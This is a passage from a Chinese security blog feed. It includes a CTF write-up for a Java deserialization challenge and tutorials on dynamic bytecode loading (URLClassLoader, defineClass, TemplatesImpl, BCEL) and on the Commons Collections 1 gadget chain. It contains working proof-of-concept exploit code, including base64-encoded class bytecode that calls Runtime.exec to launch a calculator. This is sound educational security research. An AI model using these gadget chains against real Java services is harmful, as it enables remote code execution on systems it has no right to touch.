href="#东华杯-Java-复现" class="headerlink" title="东华杯 Java 复现"></a>东华杯 Java 复现</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109150754356.png" alt="image-20211109150754356"></p><p>看到这里我们就够马上反应出 CC5 和利用 <code>defineClass</code> 加载字节码的操作，利用<code>javax.management.BadAttributeValueExpException</code>的<code>readObject()</code>方法调用到<code>ToStringBean</code>的<code>toString()</code>方法，最后利用<code>defineClass()</code>动态加载字节码完成命令执行</p><p>先构造需要使用的字节码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109235536455.png" alt="image-20211109235536455"></p><p>编写序列化利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lcdm123;<br><br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException </span>&#123;<br>        ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean();<br>        Class clazz1 = Class.forName(<span class="hljs-string">&quot;com.ezgame.ctf.tools.ToStringBean&quot;</span>);<br>        Field ClassByte = clazz1.getDeclaredField(<span class="hljs-string">&quot;ClassByte&quot;</span>);<br>        ClassByte.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAHgoABwAQBwARCAASCgATABQKABMAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENv&quot;</span> +<br>                <span class="hljs-string">&quot;ZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAKU291cmNlRmlsZQEADFVSTFRl&quot;</span> +<br>                <span class="hljs-string">&quot;c3QuamF2YQwACAAJAQAQamF2YS9sYW5nL1N0cmluZwEAEGdub21lLWNhbGN1bGF0b3IHABkMABoA&quot;</span> +<br>                <span class="hljs-string">&quot;GwwAHAAdAQAHVVJMVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9u&quot;</span> +<br>                <span class="hljs-string">&quot;AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAEAAQAIAAkAAgAKAAAAOwAEAAIAAAAXKrcAAQS9AAJZAxIDU0y4AAQrtgAFV7EAAAABAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAASAAQAAAAEAAQABQAOAAYAFgAHAAwAAAAEAAEADQABAA4AAAACAA8=&quot;</span>);<br>        ClassByte.set(toStringBean,bytes);<br><br>        BadAttributeValueExpException expException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        Class clazz2 = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        Field val = clazz2.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-keyword">true</span>);<br>        val.set(expException, toStringBean);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objOutputStream.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);<br>        objOutputStream.writeInt(<span class="hljs-number">2021</span>);<br>        objOutputStream.writeObject(expException);<br>        objOutputStream.close();<br>        Base64.Encoder encoder = Base64.getEncoder();<br>        String result = encoder.encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109235709887.png" alt="image-20211109235709887"></p><p>成功弹出计算机</p><blockquote><p>注意使用URL编码一下</p></blockquote><p>在没有回显的情况下可以使用 <code>DNSlog</code> 测试一下（学校晚上断网所以只好在本地弹计算机玩玩了）</p><p>需要注意的点：</p><ul><li>POC这里需要保持类的路径一样</li></ul><p><del>这里复现失败了不知道是什么原因，POC的思路和我的是一样的</del> 太粗心了</p><p>这个题目现在看来确实简单，当时没有学习所以硬是没有看出来，确实是太菜了呀，已经又在反省了。</p><p>参考文章</p><p><a href="https://su18.org/post/ysoserial-su18-2/">https://su18.org/post/ysoserial-su18-2/</a></p><p><a href="https://y4er.com/post/ysoserial-commonscollections-5/">https://y4er.com/post/ysoserial-commonscollections-5/</a></p><p><a href="https://www.guildhab.top/2020/06/java-rmi-%e5%88%a9%e7%94%a84-%e6%9c%80%e5%9f%ba%e6%9c%ac%e7%9a%84%e4%b8%a4%e6%9d%a1-apache-commons-collections-pop-gadget-chains/">https://www.guildhab.top/2020/06/java-rmi-%e5%88%a9%e7%94%a84-%e6%9c%80%e5%9f%ba%e6%9c%ac%e7%9a%84%e4%b8%a4%e6%9d%a1-apache-commons-collections-pop-gadget-chains/</a></p><p><a href="https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://ego00.blog.csdn.net/article/details/119734674">https://ego00.blog.csdn.net/article/details/119734674</a></p><p><a href="https://ego00.blog.csdn.net/article/details/121072948">https://ego00.blog.csdn.net/article/details/121072948</a></p><p><a href="https://ctf.njupt.edu.cn/724.html">https://ctf.njupt.edu.cn/724.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java动态加载字节码</title>
    <link href="/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-动态加载字节码"><a href="#Java-动态加载字节码" class="headerlink" title="Java 动态加载字节码"></a>Java 动态加载字节码</h1><p>严格的说，java 字节码其实仅仅指的是 java 虚拟机执行使用的一类指令，通常存储在 class 文件中。这里的字节码可以理解为所有能够恢复成一类并且在JVM虚拟机里面加载的字节序列。</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p><code>ClassLoader</code>就是一个加载器，告诉JVM如何加载这个类，java默认的<code>ClassLoader</code>就是根据类名来加载类，这个类名是类的完整路径，比如<code>java.lang.Runtime</code></p><p>正常情况下，java 会根据配置项<code>sun.boot.class.path</code> 和 <code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找 .class 文件来加载，这个基础路径分为三种情况：</p><ol><li><p>URL未以<code>/</code> 结尾，则认为是一个 jar 文件，使用<code>JarLoader</code>来寻找类，即为在jar包中寻找 .class 文件</p></li><li><p>URL以<code>/</code>结尾，且协议名为<code>file</code>则使用<code>FileLoader</code>来寻找类，即为在本地文件系统中寻找 .class 文件</p></li><li><p>URL以<code>/</code>结尾，且协议名不是<code>file</code>，则使用最基础的<code>Loader</code>来寻找类</p><blockquote><p>正常情况下是使用的前两类，第三种情况中最常见的协议就是<code>http</code></p></blockquote></li></ol><p>利用<code>URLClassLoader</code>加载远程 .class 文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109003101520.png" alt="image-20211109003101520"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109002927864.png" alt="image-20211109002927864"></p><p>成功加载了服务器上的函数代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109003256333.png" alt="image-20211109003256333"></p><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p>不管是加载远程 class 文件，还是本地的 class 文件或 jar文件， 都会经历下面三个方法调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109112249145.png" alt="image-20211109112249145"></p><ul><li><code>loadClass</code> 的作用是从已经加载的类缓存，父加载器等位置寻找类（双亲委派机制），在没有找到的情况下执行<code>findClass</code></li><li><code>findClass</code> 的作用就是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统，jar包或者远程http服务器上读取字节码然后交给<code>defineClass</code></li><li><code>defineClass</code>的作用就是处理前面传入的字节码，将其处理成真正的类</li></ul><p>所以核心部分就是<code>defineClass</code> 它决定了如何将字节码转换为 java 类，java 默认的<code>ClassLoader#defineClass</code>是一个 native 方法，逻辑主要在 JVM 的C语言代码中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109010604955.png"></p><p>由于 <code>ClassLoader#defineClass</code>方法是 protected 所以无法直接调用需要使用反射的方式</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109010548813.png" alt="image-20211109010548813"></p><p><img src="D:\markdown\image-20211109120744346.png" alt="image-20211109120744346"></p><p>在实际情况中<code>defineClass</code>的方法作用域是不开放的，所以很少直接利用它进行工具，但是在<code>TemplatesImpl</code>中经常利用到它</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>在<code>TemplatesImpl</code>中定义了一个内部类<code>TransletClassLoader</code>，在这个类中重写了<code>defineClass()</code>,</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109122411306.png" alt="image-20211109122411306"></p><p>反过来追踪一下调用链</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123220585.png" alt="image-20211109123220585"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123310590.png" alt="image-20211109123310590"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123332228.png" alt="image-20211109123332228"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123353576.png" alt="image-20211109123353576"></p><p>最后追踪到的地方就是 <code>newTransformer()</code> 和 <code>getOutputProperties()</code> 它们的作用域都是 public 可以被外部调用。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>  -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>这里利用<code>newTransformer()</code>来构造POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLUse</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, MalformedURLException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException, TransformerConfigurationException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = base64decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABZUZW1wbGF0ZXNJbXBsVGVzdC5qYXZhDAAOAA8HABsMABwAHQEADUhlbGxvIGxjZG0xMjMHAB4MAB8AIAEAHW9yZy9sY2RtMTIzL1RlbXBsYXRlc0ltcGxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABIACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAAVAAQAFgAMABcAAQAQAAAAAgAR&quot;</span>);<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] base64decode(String encode)&#123;<br>        Base64.Decoder decoder = Base64.getDecoder();<br>        <span class="hljs-keyword">return</span> decoder.decode(encode);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>setFieldValue()</code>利用反射的方法将私有属性反射出来让我们可以利用，这里利用了三个变量<code>_bytecodes</code> <code>_name</code> <code>_tfactory</code>。 <code>_bytecodes</code>是由字节码组成的数组；<code>_name</code>是任意字符串，<code>_tfactory</code> 需要一个<code>TransformerFactoryImpl</code>对象，因为<code>TemplatesImpl#defineTransletClasses() </code>方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。<a href="http://wjlshare.com/archives/1509">http://wjlshare.com/archives/1509</a></p><p>并且<code>TemplatesImpl</code>中对加载的字节码有一定的要求，这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplatesImplTest</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello lcdm123&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译为class文件然后用base64编码的方法获取文件内容，提供给类加载</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109132314399.png" alt="image-20211109132314399"></p><p>在很多的 java 反序列化链中都出现过<code>TemplatesImpl</code>类</p><h2 id="BCEL-ClassLoader-加载字节码"><a href="#BCEL-ClassLoader-加载字节码" class="headerlink" title="BCEL ClassLoader 加载字节码"></a>BCEL ClassLoader 加载字节码</h2><p>BCEL的全名Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan 所使用，而 Apache Xalan 又是 java 内部对于 JAXP 的实现，所以BCEL也被包含在了 JDK 的原生库中。</p><p><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109144412406.png" alt="image-20211109144412406"></p><blockquote><p>需要在 BCEL字节码的前面加上 $$BCEL$$ 这样才会将他将它判断为BCEL字节码才会执行BCEL加载字节码</p></blockquote><p>参考文章</p><p>P神代码审计</p><p><a href="https://ego00.blog.csdn.net/article/details/119763746">https://ego00.blog.csdn.net/article/details/119763746</a></p><p><a href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/">https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/119082164">https://y4tacker.blog.csdn.net/article/details/119082164</a></p><p><a href="http://wjlshare.com/archives/1509">http://wjlshare.com/archives/1509</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java CC链1</title>
    <link href="/2021/11/08/Java-CC1/"/>
    <url>/2021/11/08/Java-CC1/</url>
    
    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>ubuntu + java7 + IDEA</p><h2 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h2><p>利用 maven 构造环境，以下代码是参考 P神代码审计中的样例，先测试以下效果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行后成功打开计算器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105164317083.png" alt="image-20211105164317083"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>一个接口，定义了一个<code>transform()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105191330954.png" alt="image-20211105191330954"></p><p><code>ConstantTransformer</code> <code>InvokerTransformer</code> <code>ChainedTransformer</code> 都实现了这个接口</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105190935528.png" alt="image-20211105190935528"></p><p>测试一下这个类的作用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105203849930.png" alt="image-20211105203849930"></p><p>传入的参数是一个 <code>Map</code>对象和两个实现了<code>Transformer</code>接口类的对象，返回值是一个<code>Map</code>类型的对象。它的作用就是来修饰 <code>Map</code>的，当被修饰的<code>Map</code>被添加新元素时将可以执行一个回调。上面的代码就是对<code>hashmap</code> 进行修饰，返回的<code>map</code>就是修饰后的<code>Map</code>，其中 <code>KeyTransformer</code> 是处理新元素的<code>key</code>的回调,<code>valueTransformer</code>是处理新元素的<code>value</code>的回调。        </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105210022366.png" alt="image-20211105210022366"></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105210904067.png" alt="image-20211105210904067"></p><p>这个类的代码很少，该类的<code>transform()</code> 方法就是返回构造时的参数。        </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105212302747.png" 